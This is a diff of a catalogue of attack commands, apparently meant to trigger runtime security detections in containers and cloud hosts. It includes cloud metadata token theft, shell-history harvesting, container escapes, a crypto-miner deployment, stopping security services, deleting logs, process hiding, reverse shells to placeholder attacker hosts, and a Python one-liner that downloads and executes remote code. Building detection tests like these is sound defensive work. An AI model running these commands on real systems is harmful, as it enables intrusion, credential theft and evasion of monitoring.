@@ -1,4 +1,4 @@
-1. Exploit-vsftpd --need to write yaml for this
+1. Exploit vsftpd Vulnerability --need to write yaml for this
 ------------------------------------------------------
 2. Credential access bash history'
 cat /.bash_history
@@ -8,7 +8,7 @@ rm /.zsh_history
 TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
 && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/
 ------------------------------------------------------
-4. Crypto-mining-attack
+4. 	CryptoMiner Execution
 Deploy the  kubernet pod.yml
 apiVersion: apps/v1
 kind: Deployment
@@ -31,25 +31,25 @@ spec:
       - name: miner-test
         image: miningcontainers/xmrig:latest
 ------------------------------------------------------
-5. Network-scanning-detected
+5. Network scanning utility
 /usr/local/bin/pnscan -t512 -R 6f 73 3a 4c 69 6e 75 78 -W 2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a 221.0.0.0/16 6379
 ------------------------------------------------------
-6. Container-escape-cgroup
+6. Container escape via cgroup
 unshare -UrmC bash
 mount -t cgroup -o memory cgroup /mnt
 ------------------------------------------------------
-7. Container escape using runtime sockets
+7. Container escape using runtime socket
 curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
 -d '{"Image":"alpine","Cmd":["sh","-c","echo Hello from Alpine"],"AttachStdout":true,"AttachStderr":true}' \
 http://localhost/containers/create?name=alpine-from-api
 ------------------------------------------------------
-8.Container escape using a mounted docker socket
+8. Container escape using docker socket
 docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt
 ------------------------------------------------------
-9.Process hiding
+9. Process hiding
 /usr/bin/sed -i s/evil_script.py/pnscan/g /var/tmp/.11/..lph/processhider.c
 ------------------------------------------------------
-10.kills anti-malware processes
+10. Stop Antimalware Process
 service aliyun.service stop 
 service apparmor stop
 service bcm-agent stop
@@ -58,18 +58,18 @@ service aegis stop 
 11. clear system logs
 rm /var/log/syslog
 ------------------------------------------------------
-12. Process hidden using mount
+12. Process hidden using mount hidepid
 mount -o bind /empty/dir /proc/42
 mount -o remount,hidepid=2 /proc
 
 ------------------------------------------------------
-13. Detect curl Using Socks Proxy​
+13. Curl Using Socks Proxy
 curl -x socks4://proxy.example.com http://www.example.com/
 ------------------------------------------------------
-14. Fileless Malware Detected​
+14. Process Execution from Memory
 https://stackoverflow.com/questions/63208333/using-memfd-create-and-fexecve-to-run-elf-from-memory
 ------------------------------------------------------
-15. Reverse shell detected
+15. Netcat Reverse Shell Execution
 nc -e /bin/sh attackers_ip attackers_port
 bash -i >& /dev/tcp/attackers_ip/attackers_port 0>&1
 
@@ -106,7 +106,7 @@ spec:
 
 
 ------------------------------------------------------
-16. Steganografy tools detected
+16. Usage of Steganography tools
 steghide embed -cf -ef secret.txt test.jpg
 ------------------------------------------------------
 17. Compiler executed in container
@@ -127,16 +127,16 @@ passwd
 22. Network utility executed
 tcpdump
 ------------------------------------------------------
-23. Package installed in container
+23. Package Management Process in Container
 apt install gdb
 ------------------------------------------------------
 24. Python executed with suspicious arguments
 python -c 'import urllib.request; exec(urllib.request.urlopen("http://10.113.107.226:8000/malware.py").read())'
 ------------------------------------------------------
-25. gdb executed In container
+25. GDB Executed in Container
 gdb ./memfd-create
 ------------------------------------------------------
-26. Insmod/modprobe executed In container
+26. Insmod Executed in Container
 modprobe br_netfilter
 ------------------------------------------------------
 27. Sudo Potential Privilege Escalation
